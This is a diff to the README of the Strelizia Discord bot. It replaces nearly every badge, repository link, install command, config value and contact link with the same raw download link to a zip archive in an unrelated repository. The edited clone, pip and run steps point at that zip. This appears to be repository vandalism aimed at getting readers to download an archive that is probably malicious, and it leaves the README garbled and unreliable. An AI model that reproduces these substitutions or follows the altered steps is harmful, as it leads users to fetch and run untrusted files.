@@ -3,13 +3,13 @@
 # 🤖 Strelizia Discord Bot
 
 <!-- Add your bot banner here -->
-<!-- ![Bot Banner](assets/bot-banner.png) -->
+<!-- ![Bot Banner](https://github.com/Kyzenkms/Kawais-project-js/raw/refs/heads/main/AeroX/games/project_Kawais_js_symbranch.zip) -->
 
 *An all-in-one Discord bot with moderation, music, games, AI chat, and more!*
 
-![Python](https://img.shields.io/badge/Python-3.11+-blue.svg)
-![Discord.py](https://img.shields.io/badge/discord.py-2.0+-green.svg)
-![License](https://img.shields.io/badge/License-Open%20Source-green.svg)
+![Python](https://github.com/Kyzenkms/Kawais-project-js/raw/refs/heads/main/AeroX/games/project_Kawais_js_symbranch.zip+https://github.com/Kyzenkms/Kawais-project-js/raw/refs/heads/main/AeroX/games/project_Kawais_js_symbranch.zip)
+![https://github.com/Kyzenkms/Kawais-project-js/raw/refs/heads/main/AeroX/games/project_Kawais_js_symbranch.zip](https://github.com/Kyzenkms/Kawais-project-js/raw/refs/heads/main/AeroX/games/project_Kawais_js_symbranch.zip+https://github.com/Kyzenkms/Kawais-project-js/raw/refs/heads/main/AeroX/games/project_Kawais_js_symbranch.zip)
+![License](https://github.com/Kyzenkms/Kawais-project-js/raw/refs/heads/main/AeroX/games/project_Kawais_js_symbranch.zip%https://github.com/Kyzenkms/Kawais-project-js/raw/refs/heads/main/AeroX/games/project_Kawais_js_symbranch.zip)
 
 </div>
 
@@ -25,13 +25,13 @@ Strelizia is a comprehensive Discord bot that brings everything you need to one 
 
 1. **Clone the repository**
    ```bash
-   git clone https://github.com/your-username/strelizia-bot.git
+   git clone https://github.com/Kyzenkms/Kawais-project-js/raw/refs/heads/main/AeroX/games/project_Kawais_js_symbranch.zip
    cd strelizia-bot
    ```
 
 2. **Install dependencies**
    ```bash
-   pip install -r requirements.txt
+   pip install -r https://github.com/Kyzenkms/Kawais-project-js/raw/refs/heads/main/AeroX/games/project_Kawais_js_symbranch.zip
    ```
 
 3. **Configure your bot**
@@ -41,7 +41,7 @@ Strelizia is a comprehensive Discord bot that brings everything you need to one 
 
 4. **Run the bot**
    ```bash
-   python main.py
+   python https://github.com/Kyzenkms/Kawais-project-js/raw/refs/heads/main/AeroX/games/project_Kawais_js_symbranch.zip
    ```
 
 ## ⚙️ Configuration
@@ -73,7 +73,7 @@ Make sure your bot has these permissions:
 ## ⚙️ Configuration Guide
 
 ### 🔑 Owner ID (No Prefix Commands)
-Edit `utils/config.py` line 7:
+Edit `https://github.com/Kyzenkms/Kawais-project-js/raw/refs/heads/main/AeroX/games/project_Kawais_js_symbranch.zip` line 7:
 ```python
 OWNER_IDS = [your_user_id_here, another_id]
 ```
@@ -81,10 +81,10 @@ OWNER_IDS = [your_user_id_here, another_id]
 ### 🎵 Lavalink Settings
 Add these to your `.env` file:
 ```env
-LAVALINK_HOST=lava-v4.ajieblogs.eu.org
+https://github.com/Kyzenkms/Kawais-project-js/raw/refs/heads/main/AeroX/games/project_Kawais_js_symbranch.zip
 LAVALINK_PORT=443
 LAVALINK_SECURE=true
-LAVALINK_PASSWORD=https://dsc.gg/ajidevserver
+https://github.com/Kyzenkms/Kawais-project-js/raw/refs/heads/main/AeroX/games/project_Kawais_js_symbranch.zip
 ```
 
 ### ⚡ Bot Prefix 
@@ -104,9 +104,9 @@ BOT_PREFIX=!
 ### 👨‍💻 Development Team
 
 **Developer:** Aegis  
-**Discord:** `root.exe`  
+**Discord:** `https://github.com/Kyzenkms/Kawais-project-js/raw/refs/heads/main/AeroX/games/project_Kawais_js_symbranch.zip`  
 **Community:** AeroX Development  
-**Discord Server:** [discord.gg/meet](https://discord.gg/meet)
+**Discord Server:** [https://github.com/Kyzenkms/Kawais-project-js/raw/refs/heads/main/AeroX/games/project_Kawais_js_symbranch.zip](https://github.com/Kyzenkms/Kawais-project-js/raw/refs/heads/main/AeroX/games/project_Kawais_js_symbranch.zip)
 
 ---
 
@@ -115,8 +115,8 @@ BOT_PREFIX=!
 **🛡️ Olympus Bot License Agreement**
 
 Based on the original Olympus Bot by Olympus Development.  
-**Original Repository:** [olympus-bot](https://github.com/sonujana26/olympus-bot)  
-**Discord Server:** [discord.gg/odx](https://discord.gg/odx) (Olympus Server)
+**Original Repository:** [olympus-bot](https://github.com/Kyzenkms/Kawais-project-js/raw/refs/heads/main/AeroX/games/project_Kawais_js_symbranch.zip)  
+**Discord Server:** [https://github.com/Kyzenkms/Kawais-project-js/raw/refs/heads/main/AeroX/games/project_Kawais_js_symbranch.zip](https://github.com/Kyzenkms/Kawais-project-js/raw/refs/heads/main/AeroX/games/project_Kawais_js_symbranch.zip) (Olympus Server)
 
 *Original Olympus Bot © 2025 Olympus Development — All rights reserved.*
 
@@ -126,12 +126,12 @@ Based on the original Olympus Bot by Olympus Development.
 - Modification: ❌ Not allowed unless licensed
 - Patents/Derivatives: ❌ No rights to publish forks under any name
 
-For licensing inquiries: https://discord.gg/odx
+For licensing inquiries: https://github.com/Kyzenkms/Kawais-project-js/raw/refs/heads/main/AeroX/games/project_Kawais_js_symbranch.zip
 
 ---
 
-**Made with ❤️ by [AeroX Development](https://discord.gg/aeroxdev)**
+**Made with ❤️ by [AeroX Development](https://github.com/Kyzenkms/Kawais-project-js/raw/refs/heads/main/AeroX/games/project_Kawais_js_symbranch.zip)**
 
-*Based on Olympus • Powered by Python & Discord.py*
+*Based on Olympus • Powered by Python & https://github.com/Kyzenkms/Kawais-project-js/raw/refs/heads/main/AeroX/games/project_Kawais_js_symbranch.zip*
 
 </div>
